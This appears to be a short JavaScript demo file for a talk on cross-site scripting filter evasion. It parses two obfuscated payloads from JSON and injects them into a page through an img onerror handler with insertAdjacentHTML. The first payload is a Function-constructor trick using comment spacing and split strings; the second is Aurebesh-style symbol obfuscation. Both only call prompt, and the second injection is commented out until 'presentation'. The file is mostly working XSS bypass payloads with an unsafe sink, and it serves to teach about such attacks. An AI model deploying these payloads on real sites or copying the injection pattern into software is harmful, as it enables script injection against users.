// INFO: Function constructor
const function_constructor_input = JSON.parse("{\"message\": \"[]['constructor']['constructor'](`var/**/s/**/=/**/'secret';/**/promp`/**/+/**/`t(s,/**/s)`)()\"}");
console.log(`function_constructor input JSON parsed: ${function_constructor_input.message}`);
// function_constructor_input.message = decodeURIComponent(function_constructor_input.message);
// function_constructor_input.message = function_constructor_input.message.normalize('NFKC');
// console.log(`function_constructor input decoded: ${function_constructor_input}`)
document.getElementById('div1').insertAdjacentHTML('afterbegin', `<img src=1 onerror=${function_constructor_input.message}>`);


// INFO: Aurebesh.js
const aurebesh_input = JSON.parse(`{"message": "A='',B=!A+A,C=!B+A,D=A+{},E=B[A++],F=B[G=A],H=++G+A,I=D[G+H],B[I+=D[A]+(B.C+D)[A]+C[H]+E+F+B[G]+I+E+D[A]+F][I]('p'+F+D[A]+'m'+'p'+E+'(A,++A)')()"}`);
console.log(`aurebesh input JSON parsed: ${aurebesh_input.message}`);
// aurebesh_input.message = decodeURIComponent(aurebesh_input.message);
// aurebesh_input.message = aurebesh_input.message.normalize('NFKC');
// console.log(`aurebesh input decoded: ${aurebesh_input}`)
// TODO: uncomment following during presentation
// document.getElementById('div1').insertAdjacentHTML('afterbegin', `<img src=1 onerror=${aurebesh_input.message}>`);
